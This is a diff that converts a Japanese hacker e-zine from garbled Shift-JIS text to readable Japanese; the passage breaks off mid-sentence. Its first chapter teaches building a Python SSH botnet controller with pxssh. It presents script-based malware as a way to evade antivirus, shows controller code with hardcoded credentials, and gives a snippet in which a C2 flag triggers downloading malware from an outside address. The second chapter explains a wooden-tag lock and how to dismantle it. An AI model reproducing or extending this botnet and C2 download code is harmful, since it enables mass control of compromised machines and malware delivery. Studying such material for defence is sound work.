@@ -8,76 +8,76 @@
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
----- ��0�́F�ڎ� ---
+---- 第0章：目次 ---
 
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
-����1��: Python�Ŏn�߂�ȈՃ{�b�g�l�b�g�\�z                      ���ь� ��
+○第1章: Pythonで始める簡易ボットネット構築                      黒林檎 著
 
-����2��: ���|���̍\���Ɖ���                                    IPUSIRON ��
+○第2章: 松竹錠の構造と解錠                                    IPUSIRON 著
 
-����3��: ���m�点
+○第3章: お知らせ
 
-����4��: ���҃v���t�B�[��
+○第4章: 著者プロフィール
 
 
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
---- ��1��: Python�Ŏn�߂�ȈՃ{�b�g�l�b�g�\�z ---
+--- 第1章: Pythonで始める簡易ボットネット構築 ---
 
-���ҁF���ь�
+著者：黒林檎
 
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
 
-��0x01.) �ŏ���
+■0x01.) 最初に
 
-�@�����Python�x�[�X�̃}���E�F�A�ɂ��ĐG��Ă݂����ȂƎv���܂��B
-�@�������ł����A�R�}���h���R���g���[���T�[�o�ւ̐ڑ���A�L�[�{�[�h����
-�у}�E�X�C�x���g���t�b�N�Ƃ���L�[���K�[�Ȃǂ�Python�ō쐬���邱�Ƃ��ł�
-�܂��B
-�@�X�N���v�g�x�[�X�ō쐬�����ȗ��R�̓E�C���X���o������邽�߂ł��B���
-�ɃE�C���X�Ƃ��Ă̌��o���͒Ⴍ�Ȃ�X��������Ƃ����Ă��܂��B
+　今回はPythonベースのマルウェアについて触れてみたいなと思います。
+　もちろんですが、コマンド＆コントロールサーバへの接続や、キーボードおよ
+びマウスイベントをフックとするキーロガーなどもPythonで作成することができ
+ます。
+　スクリプトベースで作成する主な理由はウイルス検出を避けるためです。一般
+にウイルスとしての検出率は低くなる傾向があるといわれています。
 
-�@�����SSH�Ŗ��߂𑗂�ȈՃ{�b�g�l�b�g���쐬���܂��B
-�@�{�b�g�l�b�g�Ƃ����Ɛ����Z�p�݂����Ȋ����ł��ˁB�ȒP�ɂ܂Ƃ߂Ă��܂���
-������̃p�\�R����SSH�ň�C�ɑ��삷��R���g���[���[�̍쐬�ł��B�Ȃ̂Ŗ���
-���s����SSH���K�{�ł��B��y�Ɏ��s�o����̂ŁA�g�����ėV��ł݂Ă��������B
+　今回はSSHで命令を送る簡易ボットネットを作成します。
+　ボットネットというと凄い技術みたいな感じですね。簡単にまとめてしまうと
+複数台のパソコンをSSHで一気に操作するコントローラーの作成です。なので命令
+実行側はSSHが必須です。手軽に実行出来るので、拡張して遊んでみてください。
 
 
-��0x02.) Test���\�z
+■0x02.) Test環境構築
 
-�E�p�\�R��A�i���ߑ���p�\�R���j
-�@���ߑ��M��SSH���g�p���邽��pxssh�Ƃ������W���[������ɓ���Ă����Ă���
-�����B
+・パソコンA（命令送るパソコン）
+　命令送信はSSHを使用するためpxsshというモジュールを手に入れておいてくだ
+さい。
 
 http://pexpect.sourceforge.net/pxssh.html
 
-�E���z���iVmware��vagrant�Ȃǂł��A���ߎ��s���j
+・仮想環境（Vmwareやvagrantなどでも可、命令実行役）
 	[ISO]
-	���D�݂�OS��ISO�ŉ�
-	[box�t�@�C��]
-	Ubuntu box�_�E�����[�h�����N
+	お好みのOSのISOで可
+	[boxファイル]
+	Ubuntu boxダウンロードリンク
 	https://cloud-images.ubuntu.com/vagrant/trusty/current/
 
-�E�p�\�R��B�i�K�{�ł͖����A���ߎ��s���j
+・パソコンB（必須では無い、命令実行役）
 
-�@������vagrant�ŉ��z�����쐬���܂��B
-�@vagrant�������Ŏg�p�����ȖړI�́A�����ȒP�Ɂi�D�݂̏�ԂŁj�쐬�ł�
-�邩��ł��B�����������Ƃɂ������Ȃ���΁AVirtualBox��Vmware�ȂǂƂ���
-��vagrant�ȊO�̉��z�����g�p���Ă���肠��܂���B
+　ここでvagrantで仮想環境を作成します。
+　vagrantをここで使用する主な目的は、環境を簡単に（好みの状態で）作成でき
+るからです。こうしたことにこだわらなければ、VirtualBoxやVmwareなどといっ
+たvagrant以外の仮想環境を使用しても問題ありません。
 
-�@�O��Ƃ��āA��قǂ�Ubuntu��box�t�@�C�����_�E�����[�h���āA�C�ӂ̃f�B��
-�N�g���ɂ��邱�ƂƂ��܂��B
+　前提として、先ほどのUbuntuのboxファイルをダウンロードして、任意のディレ
+クトリにあることとします。
 
 -----
-$vagrant box add ubuntu00 [box�t�@�C���ւ̐�΃p�X]
+$vagrant box add ubuntu00 [boxファイルへの絶対パス]
 ----
 
-��vagrant up�菇����
+○vagrant up手順メモ
 
 -----
 r00tapple@ubuntu:~/ubuntu$ vagrant box add ubuntu /home/r00tapple/Downloads/trusty-server-cloudimg-i386-vagrant-disk1.box
@@ -99,13 +99,13 @@ vm:
 * The box 'base' could not be found.
 -----
 
-�@�uvagrant box add�v�͐������܂������A�uvagrant up�v�ɂ͎��s���܂����B��
-���base�Ȃ�ĕ��͑��݂��Ȃ��Ƃ����G���[�Ȃ̂�vagrantfile����������������
-�K�v������܂��B
-�@���������镔����vagrantfile�ɂ��邩�������ʑ��𓥂܂Ȃ��悤�Ɋm�F���܂�
-�傤�B
+　「vagrant box add」は成功しましたが、「vagrant up」には失敗しました。こ
+れはbaseなんて物は存在しないというエラーなのでvagrantfileを少し書き換える
+必要があります。
+　書き換える部分がvagrantfileにあるかだけ無駄足を踏まないように確認しまし
+ょう。
 
-���m�F
+○確認
 
 -----
 r00tapple@ubuntu:~/ubuntu$ strings Vagrantfile | grep base
@@ -117,13 +117,13 @@ r00tapple@ubuntu:~/ubuntu$ strings Vagrantfile | grep base
 config.vm.box = "base"
 -----
 
-��
+を
 
 -----
 config.vm.box = "ubuntu00"
 -----
 
-�ɏ����������vagrant up���������܂��B
+に書き換えればvagrant upが成功します。
 
 -----
 r00tapple@ubuntu:~/ubuntu$ vagrant box list
@@ -134,31 +134,31 @@ Bringing machine 'default' up with 'virtualbox' provider...
 [default] Importing base box 'ubuntu'...
 [default] Matching MAC address for NAT networking...
 [default] Setting the name of the VM...
-�ȉ���
+以下略
 -----
 
-�@����SSH�ڑ����邽�߂�vagrantfile�̐ݒ�����������܂��B
+　次にSSH接続するためにvagrantfileの設定を書き直します。
 
 -----
 r00tapple@ubuntu:~/ubuntu$ strings Vagrantfile | grep 192.168.
 #config.vm.network :private_network, ip: "192.168.33.10"
 -----
 
-�@�͂��B�uconfig.vm.network�v�̐擪�ɂ���R�����g�A�E�g�ł���u#�v������
-�Ă��������B
-�@vagrant�ɍD���ȃ��[�U�[���쐬���Ă��������B
+　はい。「config.vm.network」の先頭にあるコメントアウトである「#」を消し
+てください。
+　vagrantに好きなユーザーを作成してください。
 
 -----
 vagrant@vagrant$useradd
 vagrant@vagrant$adduser
 -----
 
-�@�D���ȃ��[�U�[���쐬���A�p�X���[�h�Ȃǐݒ肵�Ă����Ă��������i��X�g�p
-���܂��j�B
+　好きなユーザーを作成し、パスワードなど設定しておいてください（後々使用
+します）。
 
-�@���̏�Ԃ�SSH�ڑ����ł��邩���m�F���Ă݂܂��B
+　この状態でSSH接続ができるかを確認してみます。
 
-���ڑ�
+○接続
 
 -----
 r00tapple@ubuntu:~/script/pybot$ ssh -l guest 192.168.33.10
@@ -188,56 +188,56 @@ Last login: Thu Mar 26 17:51:33 2015 from 192.168.33.1
 guest@vagrant-ubuntu-trusty-32:~$
 -----
 
-�@�����܂łł����test���̍쐬�͏I���ł��B
+　ここまでできればtest環境の作成は終了です。
 
-�������A�ݒ�ɂ���Ă̓f�t�H���g�ł̓p�X���[�h�F�؂��ł��Ȃ��悤�ɂ��Ă�
-��ꍇ������̂ł��C��t�����������B
+※ただ、設定によってはデフォルトではパスワード認証ができないようにしてあ
+る場合もあるのでお気を付けください。
 
 
-��0x03.) pxssh�ɂ���
+■0x03.) pxsshについて
 
-�@pxssh�͂���̓��O�C���A���O�A�E�g���邽�߂̃��\�b�h��ǉ����A�V�F������
-�ɓ���邱�Ƃ��ł��܂��B
+　pxsshはこれはログイン、ログアウトするためのメソッドを追加し、シェルを手
+に入れることができます。
 
 -----
 http://pexpect.sourceforge.net/pxssh.html
  import pxssh
     import getpass
     try:            
-    	#�ڑ��ݒ�                                                
+    	#接続設定                                                
         s = pxssh.pxssh()
         hostname = raw_input('hostname: ')
         username = raw_input('username: ')
         password = getpass.getpass('password: ')
         s.login (hostname, username, password)
 
-        #uptime�R�}���h
-        s.sendline ('uptime')  #�R�}���h���s
-        s.prompt()             #�v�����v�g
-        print s.before         #���s����
+        #uptimeコマンド
+        s.sendline ('uptime')  #コマンド実行
+        s.prompt()             #プロンプト
+        print s.before         #実行結果
 
-        #ls�R�}���h
+        #lsコマンド
         s.sendline ('ls -l')
         s.prompt()
         print s.before
 
-        #df�R�}���h
+        #dfコマンド
         s.sendline ('df')
         s.prompt()
         print s.before
 
-        #���O�A�E�g�ƃG���[����
+        #ログアウトとエラー処理
         s.logout()
     except pxssh.ExceptionPxssh, e:
         print "pxssh failed on login."
         print str(e)
 -----
 
-�@pxssh�ɂ��Ă̑�����@���w�K�����Ƃ���ŃR���g���[���[�̍쐬�ɂ��ĐG
-�ꂽ���Ǝv���܂��B
+　pxsshについての操作方法を学習したところでコントローラーの作成について触
+れたいと思います。
 
 
-��0x04.) Python�R���g���[���[�̍쐬
+■0x04.) Pythonコントローラーの作成
 
 -----
 import pxssh
@@ -282,12 +282,12 @@ addClient('192.168.33.10', 'guest', 'toor')
 
 botnetCommand('uname -a')
 botnetCommand('ping  127.0.0.1')
-#botnetCommand('�D���ȃR�}���h')
+#botnetCommand('好きなコマンド')
 -----
 
-�@����Ă��鎖�͒P���ŁA��قǂ�pxssh�̎g�����Ǝ��������������ł��ˁB
+　やっている事は単純で、先ほどのpxsshの使い方と似た部分も多いですね。
 
-��pxssh�ɂ��Ă���
+○pxsshについてから
 
 -----
         s = pxssh.pxssh()
@@ -297,14 +297,14 @@ botnetCommand('ping  127.0.0.1')
         s.login (hostname, username, password)
 -----
 
-�@�udef __init__(self, host, user, password):�v���`�A�ڑ����clientlis
-t�ɏ����āA�uconnect(self):�v�Őڑ��ł��ˁB
-�@�udef send_command(self, cmd):�v����قǂ́A#uptime�R�}���h�Ȃǂɂ�����
-�܂��B
-�@��{�I�ɓ���������Ȃ��Ǝv���܂��B
+　「def __init__(self, host, user, password):」を定義、接続先をclientlis
+tに書いて、「connect(self):」で接続ですね。
+　「def send_command(self, cmd):」が先ほどの、#uptimeコマンドなどにあたり
+ます。
+　基本的に難しい部分がないと思います。
 
-�@����͔z��ŃN���C�A���g���`���Ă��܂����ACSV�`���̃f�[�^��ǂݎ���
-�@�ł��ǂ��Ǝv���܂��B
+　今回は配列でクライアントを定義していますが、CSV形式のデータを読み取る方
+法でも良いと思います。
 
 -----
 import csv
@@ -317,15 +317,15 @@ import csv
 			addClient(value)
 -----
 
-�@���̂悤�ɁACSV�f�[�^������N���C�A���g�f�[�^�i192.168.33.10', 'guest',
- 'toor'�j��addClient�ɓ����܂��B
+　このように、CSVデータをからクライアントデータ（192.168.33.10', 'guest',
+ 'toor'）をaddClientに投げます。
 
-�@���ɂ��g���ł������ȕ����Ƃ��āA�����������܂��B
+　他にも拡張できそうな部分として、次が挙げられます。
 
 -----
 import urllib2
 #def access():
-	add = "�A�h���X"
+	add = "アドレス"
 	try:
 		sub1 = urlopen("address1")
 		sub2 = sub1.read()
@@ -341,15 +341,15 @@ import urllib2
 			pass
 -----
 
-�@���ߕ����̊g���Ƃ��āAC2�T�[�o�[�̗�Ƃ���address1����f�[�^�i�����ł�
-����1�j�Ƃ����f�[�^���_�E�����[�h�����ꍇif�������s����Aaddress2�ɃA�N�Z
-�X���A�O������}���E�F�A���_�E�����[�h���܂��B
-�@1�Ŗ����ꍇ�i�����ł�0���]�܂����j��else�����s����܂��B
+　命令部分の拡張として、C2サーバーの例としてaddress1からデータ（ここでい
+うと1）というデータをダウンロードした場合if文が実行され、address2にアクセ
+スし、外部からマルウェアをダウンロードします。
+　1で無い場合（ここでは0が望ましい）はelseが実行されます。
 
 
-��0x05.) ���s
+■0x05.) 実行
 
-�@����ł̓X�N���v�g�����s�����Ă݂܂��B
+　それではスクリプトを実行させてみます。
 
 -----
 r00tapple@ubuntu:~/script/pybot$ python pyBot.py
@@ -385,7 +385,7 @@ rtt min/avg/max/mdev = 13.966/14.130/14.332/0.180 ms
 ...
 -----
 
-�@�g���I�ɂ�wget�g���Ă����Ⴎ������Ă��������Ƃ��ʔ����Ǝv���܂��B
+　拡張的にはwget使ってぐちゃぐちゃっていう感じとか面白いと思います。
 
 -----
 [*] Output from 192.168.33.10
@@ -400,11 +400,11 @@ Resolving nmap.org (nmap.org)...
 Connecting to nmap.org (nmap.org)|173.255.243.189|:80... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 21500913 (21M) [application/x-bzip2]
-Saving to: �enmap-5.61TEST5.tar.bz2�f
+Saving to: ‘nmap-5.61TEST5.tar.bz2’
 
 100%[====================================>] 21,500,913   149KB/s   in 92s    
 
-2015-03-26 15:09:43 (229 KB/s) - �enmap-5.61TEST5.tar.bz2�f saved [21500913/21500913]
+2015-03-26 15:09:43 (229 KB/s) - ‘nmap-5.61TEST5.tar.bz2’ saved [21500913/21500913]
 -----
 
 
@@ -412,350 +412,350 @@ Saving to: �enmap-5.61TEST5.tar.bz2�f
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
---- ��2��: ���|���̍\���Ɖ��� ---
+--- 第2章: 松竹錠の構造と解錠 ---
 
-���ҁFIPUSIRON
+著者：IPUSIRON
 
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
 
-��0x01.) ���|��
+■0x01.) 松竹錠
 
-�@���|���Ƃ͏��|���H�Ƃ��J�������A�c�ɖؐ��̌������ĉ���������O�ł��i
-�}1�Q�Ɓj�B�ؐ��̌���؎D��ԍ��D�Ƃ����܂��B
+　松竹錠とは松竹錠工業が開発した、縦に木製の鍵を入れて解錠する錠前です（
+図1参照）。木製の鍵を木札や番号札といいます。
 
-�i�}1�Fhttp://wizardbible.org/60/images/syoutiku_lock.jpg�j���|��
+（図1：http://wizardbible.org/60/images/syoutiku_lock.jpg）松竹錠
 
-�@�\���Ƃ��Ă̓E�H�[�h���ɕ��ނ���܂��B
-�@�E�H�[�h���Ƃ́A��Q�����悯�Ēʂ錮�����ɂ��{�������邱�Ƃ����ł���
-���O�ł��B���ɑ΂����Q���̂��Ƃ��E�H�[�h�iward�j�ƌĂт܂��B
-�@�������������ׂẴE�H�[�h������ĉ��؂邱�Ƃ��ł��A�f�b�h�{���g��
-�삷�邱�Ƃ��ł��܂��B����A�����ȊO�̌��̏ꍇ�́A�����ꂩ�̃E�H�[�h�ɂ�
-�����Ă��܂���肫�邱�Ƃ��ł��Ȃ����߁A�f�b�h�{���g�����삷�邱�Ƃ���
-���܂���B
+　構造としてはウォード錠に分類されます。
+　ウォード錠とは、障害物をよけて通る鍵だけにより施解錠することがができる
+錠前です。鍵に対する障害物のことをウォード（ward）と呼びます。
+　合鍵だけがすべてのウォードを避けて回り切ることができ、デッドボルトを操
+作することができます。一方、合鍵以外の鍵の場合は、いずれかのウォードにぶ
+つかってしまい回りきることができないため、デッドボルトが操作することがで
+きません。
 
-�@�؎D�͑傫�����߁A�������Ő����Ă��Ă������킩��₷���Ƃ��������b�g��
-����܂��B�����h�~���邾���ł͂Ȃ��A�����đ��l�̌C�𗚂��Ă������Ƃ�h
-�~���邱�Ƃ��ł��܂��B
-�@��g�̒l�i��4,500�`7,000�~�ł���A���̉��ʔ��p�̏��O�Ɣ�ׂč����ł��B
+　木札は大きいため、居酒屋で酔っていても鍵がわかりやすいというメリットが
+あります。盗難を防止するだけではなく、酔って他人の靴を履いていくことを防
+止することができます。
+　一組の値段が4,500〜7,000円であり、他の下駄箱用の錠前と比べて高いです。
 
-�@���a27�N�Ɋ�����ЂɂȂ�A���N�ɏ��|���̓��������܂����B�����āA���a
-29�N�ɔ������Ĉȗ��A��q�b�g���i�ɂȂ�܂����B�Â����炠��K���ŉ��ʔ���
-���O�Ƃ��Ďg�p����Ă��܂����B�����͐��ł��������߁A�������s�����Ă���A
-�悭�C�����܂ꂽ�Ƃ����w�i������܂����B���|���̓o��ȑO�́A�K���œ��܂�
-�Ă���Q���ŏ����ɂ��邽�߂ɁA�ƒ��ōł��Ђǂ������𗚂��Ă������Ƃ�����
-���B
-�@����Ƃ����Ӗ��ł́A�C�ȊO�ɂ��ߕ������l�ł��B�͈̂ߕ������邽�߂���
-���g���Ă��܂����B���̌�A���a35�N���Ɋ֐����牻�ϔ��g�������b�J�[����
-�y���n�߂܂����B�����ł́A���a37�N���ɂ͑K���Ƀ��b�J�[���ݒu����n�߂܂�
-���B���b�J�[�̕��y�ɂ��A�ߕ��̓�������Ȃ��Ȃ�܂����B
+　昭和27年に株式会社になり、同年に松竹錠の特許を取りました。そして、昭和
+29年に発売して以来、大ヒット商品になりました。古くからある銭湯で下駄箱の
+錠前として使用されてきました。当時は戦後であったため、物資が不足しており、
+よく靴が盗まれたという背景がありました。松竹錠の登場以前は、銭湯で盗まれ
+ても被害を最小限にするために、家中で最もひどい履物を履いていったといいま
+す。
+　盗難という意味では、靴以外にも衣服も同様です。昔は衣服を入れるために籠
+を使っていました。その後、昭和35年頃に関西から化粧板を使ったロッカーが普
+及し始めました。東京では、昭和37年頃には銭湯にロッカーが設置され始めまし
+た。ロッカーの普及により、衣服の盗難も少なくなりました。
 
-�@��������[���n��̘a�H�̓X�ł��闕���ɓ������ꂽ���Ƃ��A���H�X�ŗ��p��
-�ꂽ��ꍆ���Ƃ����܂��B���̌�͋������ȂǂŎg�p����A�ߔN�ł͑�苏����
-�`�F�[���ł��̗p���Ă��܂��B
+　すかいらーく系列の和食の店である藍屋に導入されたことが、飲食店で利用さ
+れた第一号だといいます。その後は居酒屋などで使用され、近年では大手居酒屋
+チェーンでも採用しています。
 
-�@���|���́u���|���v�Ƃ�������̕������������Ȃ�悤�ɁA�c�Ɏ��t���܂��B
-�؎D���O���ƁA�d�͂ɂ���x�������A�{�����܂��i�}2�Q�Ɓj�B�Ⴆ�΁A���ʔ���
-����΁A���|�������ʔ��̊J�������A�󂯍����˘g���Ɏ��t���܂��B�������A
-�ʐ^�ł��x�����₷���悤�ɉ��ɂ��Ă��܂��B
+　松竹錠は「松竹錠」という刻印の方向が正しくなるように、縦に取り付けます。
+木札を外すと、重力により閂が落ち、施錠します（図2参照）。例えば、下駄箱で
+あれば、松竹錠を下駄箱の開く扉側、受け座を戸枠側に取り付けます。ただし、
+写真では閂が見やすいように横にしています。
 
-�i�}2�Fhttp://wizardbible.org/60/images/syoutiku1.jpg�j���|���̎{����
+（図2：http://wizardbible.org/60/images/syoutiku1.jpg）松竹錠の施錠時
 
-�@�ԍ��i���邢�͕����j����v����؎D�����|���ɑ}������ƁA�x���߂�A����
-���܂��B
+　番号（あるいは文字）が一致する木札を松竹錠に挿入すると、閂が戻り、解錠
+します。
 
-�@�؎D�̗����́A���R���@���Ă��܂��i�}3�Q�Ɓj�B�\�̔ԍ��ɂ���āA���R��
-�قȂ�܂��B
+　木札の裏側は、鍵山が掘られています（図3参照）。表の番号によって、鍵山が
+異なります。
 
-�i�}3�Fhttp://wizardbible.org/60/images/syoutiku_lock_key.jpg�j���|���̌��i�����j
+（図3：http://wizardbible.org/60/images/syoutiku_lock_key.jpg）松竹錠の鍵（裏側）
 
-�@�����̖؎D�͈ꕔ�����Ă��܂����A�����ɂ͎x�Ⴀ��܂���B���̗��R�͌��
-�ǂ킩��܂��B
+　左側の木札は一部欠けていますが、解錠には支障ありません。その理由は後ほ
+どわかります。
 
-�@���|���̔ԍ���1�Ԃ���144�Ԃ܂ł���܂��B
-�@�Ȃ��Ȃ�΁A�j�p�̉��ʔ���72�i��8�i�~9��j�A���p�̉��ʔ���72�ŁA��
-�v144������ł��B120�ȏ�Ȃ���΁A�ی����̋����ʂ�Ȃ��������߁A����
-���ɂȂ����Ƃ����܂��B
-�@�I���W�i���̏��|���͌����Ƃ���180�ʂ�̌��Ⴂ�����܂��B���̂��߁A144
-�̖؎D�͂��ׂČ��Ⴂ�ɂł��܂��B
+　松竹錠の番号は1番から144番まであります。
+　なぜならば、男用の下駄箱が72個（＝8段×9列）、女用の下駄箱が72個で、合
+計144個だからです。120以上なければ、保健所の許可が通らなかったため、この
+数になったといいます。
+　オリジナルの松竹錠は原理として180通りの鍵違いを作れます。そのため、144
+個の木札はすべて鍵違いにできます。
 
-�@�C�����邿�傤�ǂ悢�����ɂ���؎D�͂悭�g���邽�߁A�Ȃ��Ȃ�₷��
-�X���ɂ���܂����B���̂��߁A���C���ɏ��|����[������ۂɂ́A1�̏��O�ɑ�
-���āA�����ɔ�����2���̖؎D��[�߂Ă��܂����B
+　靴を入れるちょうどよい高さにある木札はよく使われるため、なくなりやすい
+傾向にありました。そのため、風呂屋に松竹錠を納入する際には、1つの錠前に対
+して、紛失に備えて2枚の木札を納めていました。
 
 
-��0x02.) ���|���̕���
+■0x02.) 松竹錠の分解
 
-1�F���|���̖{�̗̂��e�ɕe�����݂��܂��i�}1�Q�Ɓj�B��������y���`�ł܂݁A
-���E�ɉ�]���邱�Ƃł˂��؂邱�Ƃ��ł��܂��B
+1：松竹錠の本体の両脇に鋲が存在します（図1参照）。しっかりペンチでつまみ、
+左右に回転することでねじ切ることができます。
 
-�i�}1�Fhttp://wizardbible.org/60/images/syoutiku2.jpg�j�e�̈ʒu
+（図1：http://wizardbible.org/60/images/syoutiku2.jpg）鋲の位置
 
-2�F�e�̐�[���������O����܂��B���ɕe�̖_�̈ꕔ���c��A���O���΂炷����
-���ł��܂���B
-�@�����ŁA�����܂Ƀy���`�̐�[�����āA�Ă��̌����ɂ��A���O�̑O�ʕ���
-���O���܂��i�}2�Q�Ɓj�B
+2：鋲の先端だけが取り外されます。穴に鋲の棒の一部が残り、錠前をばらすこと
+ができません。
+　そこで、すきまにペンチの先端を入れて、てこの原理により、錠前の前面部を
+取り外します（図2参照）。
 
-�i�}2�Fhttp://wizardbible.org/60/images/syoutiku3.jpg�j�O�ʕ������O�����Ƃ���Ƃ���
+（図2：http://wizardbible.org/60/images/syoutiku3.jpg）前面部を取り外そうとするところ
 
-3�F�O�ʕ������O���ƁA�����ɃE�H�[�h�����݂��邱�Ƃ��킩��܂��B��������
-�O�{�́A�E�����O�ʕ��ɂȂ�܂��i�}3�Q�Ɓj�B
+3：前面部を取り外すと、内部にウォードが存在することがわかります。左側が錠
+前本体、右側が前面部になります（図3参照）。
 
-�i�}3�Fhttp://wizardbible.org/60/images/syoutiku4.jpg�j�O�ʕ������O�����Ƃ���
+（図3：http://wizardbible.org/60/images/syoutiku4.jpg）前面部を取り外したところ
 
-4�F���O�{�̂𗠕Ԃ��ƁA�㕔�Ƀ��x�b�g�ڍ����Ă���Ƃ��낪����܂��B������
-�����X���ō��A���O�{�̂�����ɕ������邱�Ƃ��ł��܂��i�}4�Q�Ɓj�B
+4：錠前本体を裏返すと、上部にリベット接合しているところがあります。ここを
+平ヤスリで削り、錠前本体をさらに分解することができます（図4参照）。
 
-�i�}4�Fhttp://wizardbible.org/60/images/syoutiku5.jpg�j���x�b�g�ڍ��̃��X������
+（図4：http://wizardbible.org/60/images/syoutiku5.jpg）リベット接合のヤスリがけ
 
-5�F���O�{�̂��痠�W�����O���ƁA������2�̋���~���ɂ͂܂��Ă��܂��i
-�}5�Q�Ɓj�B
+5：錠前本体から裏蓋を取り外すと、内部に2つの金具が円柱にはまっています（
+図5参照）。
 
-�i�}5�Fhttp://wizardbible.org/60/images/syoutiku6.jpg�j���W�����O�����Ƃ���
+（図5：http://wizardbible.org/60/images/syoutiku6.jpg）裏蓋を取り外したところ
 
-�@���̋�����삷�邱�ƂŁA�{����������
+　この金具が動作することで、施解錠が制御
 
-6�F2�̋�������O���ƁA���|���̕����͊����ł��i�}6�Q�Ɓj�B
+6：2つの金具を取り外すと、松竹錠の分解は完了です（図6参照）。
 
-�i�}6�Fhttp://wizardbible.org/60/images/syoutiku7.png�j2�̋�������O�����Ƃ���
+（図6：http://wizardbible.org/60/images/syoutiku7.png）2つの金具を取り外したところ
 
-�@������2�̋���������ō\������Ă���A���ɃV���v���ł��B
-�@�ʏ�̏��O�͓����ɂ΂˂𗘗p���Ă��邱�Ƃ������ł����A���|���ł�1�{�̂�
-�˂������g�p���Ă��܂���B
+　内部は2つの金具だけだけで構成されており、非常にシンプルです。
+　通常の錠前は内部にばねを利用していることが多いですが、松竹錠では1本のば
+ねさえも使用していません。
 
 
-��0x03.) ���|���̍\��
+■0x03.) 松竹錠の構造
 
-�@�{�����̓����\���͎��̒ʂ�ł��i�}7�Q�Ɓj�B
+　施錠時の内部構造は次の通りです（図7参照）。
 
-�i�}7�Fhttp://wizardbible.org/60/images/syoutiku8.png�j�{�����̓����\��
+（図7：http://wizardbible.org/60/images/syoutiku8.png）施錠時の内部構造
 
-�@�����ł���؎D���ォ��}������ƁA�����ɂ��鍶�E�̉~���ɓ�����܂��B��
-�̂܂܉~����������ƁA�x���������݂܂��i�}8�Q�Ɓj�B
+　合鍵である木札を上から挿入すると、内部にある左右の円柱に当たります。そ
+のまま円柱が下がると、閂が引っ込みます（図8参照）。
 
-�i�}8�Fhttp://wizardbible.org/60/images/syoutiku10.jpg�j�؎D��}�������Ƃ���
+（図8：http://wizardbible.org/60/images/syoutiku10.jpg）木札を挿入したところ
 
-�@�����ł͂Ȃ��؎D��}������ƁA�؎D���E�H�[�h�Ɉ����|����A�~�������S��
-�����邱�Ƃ��ł��܂���B
-�@�܂��A������}�����Ȃ��ŁA���|���̊O������w�Ȃǂ��x���グ�悤�Ƃ��Ă��A
-�オ��܂���B
+　合鍵ではない木札を挿入すると、木札がウォードに引っ掛かり、円柱を完全に
+下げることができません。
+　また、合鍵を挿入しないで、松竹錠の外側から指などで閂を上げようとしても、
+上がりません。
 
-�@�؎D�̗����ɂ͌��R������܂��B���R���������ʒu�ɑ��݂���ƁA�E�H�[�h��
-�����āA���܂ł�������Ƒ}���ł��܂��B
-�@���R�̏㕔�͎΂߂ɃJ�b�g����Ă��܂����A����͌��R���@��Ƃ������H����
-�₷�����邽�߂ɑ��݂��A�΂߂ɃJ�b�g���ꂸ�ɐ����ɃJ�b�g����Ă��Ă��A��
-���ɂ͉e�����܂���i�}9�Q�Ɓj�B
+　木札の裏側には鍵山があります。鍵山が正しい位置に存在すると、ウォードを
+避けて、奥までしっかりと挿入できます。
+　鍵山の上部は斜めにカットされていますが、これは鍵山を掘るという加工をし
+やすくするために存在し、斜めにカットされずに垂直にカットされていても、解
+錠には影響しません（図9参照）。
 
-�i�}9�Fhttp://wizardbible.org/60/images/syoutiku21.png�j�؎D�̌��R�ƃE�H�[�h�̊֌W
+（図9：http://wizardbible.org/60/images/syoutiku21.png）木札の鍵山とウォードの関係
 
-�@�E�H�[�h���̌��i���^�j�ł��E�H�[�h������邱�Ƃ��ł��邽�߁A�������邱
-�Ƃ��ł��܂��B�������A�f�ނ��؍ނł��邽�߁A�r�b�g�ɑ������镔���������
-�\��������܂��B���̂��߁A���S�Ɏ��^�ɂ����ɁA�����������@�荞��ł���
-�̂ł��B
-�@����ł��ׂ荇�����R�̊Ԃ��Z���ꍇ�́A�����₷���ł��B�摜�̖؎D�̉E��
-�̌��R���ꕔ�����Ă��܂��B�����镪�ɂ̓E�H�[�h�ɓ�����킯�ł͂Ȃ��̂ŁA
-�����ɂ͉e�����܂���B
+　ウォード錠の鍵（歯型）でもウォードを避けることができるため、解錠するこ
+とができます。しかし、素材が木材であるため、ビットに相当する部分が割れる
+可能性があります。そのため、完全に歯型にせずに、裏側だけを掘り込んでいる
+のです。
+　それでも隣り合う鍵山の間が短い場合は、欠けやすいです。画像の木札の右側
+の鍵山も一部欠けています。欠ける分にはウォードに当たるわけではないので、
+解錠には影響しません。
 
-�@���E�ɂ���~���̂����A�~��A�i�����̉~���j���኱���Ɉړ����Ȃ��ƁA�~��B
-�i�E���̉~���j�͉�����܂���B
-�@�~��A�������������A�A�~��B�������������B�ƌĂԂ��Ƃɂ��܂��B����
